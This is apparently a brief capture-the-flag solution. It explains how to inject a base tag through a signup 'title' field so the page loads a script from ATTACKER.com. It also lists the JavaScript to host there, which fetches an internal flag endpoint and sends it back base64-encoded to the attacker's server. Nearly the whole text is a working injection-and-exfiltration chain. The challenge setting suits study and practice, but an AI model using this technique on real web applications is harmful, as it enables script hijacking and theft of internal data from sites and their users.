Make the "title" field when signing up look like `</title><base href=http://ATTACKER.com/ /><title> pwned`.
Host `/static/js/marked.min.js` on ATTACKER.com with this content:
```js
fetch("http://web:8080/flag").then(content => content.text()).then(content => fetch("/blah?" + btoa(content)));
```
and read off the flag from the base64 request sent to your server.
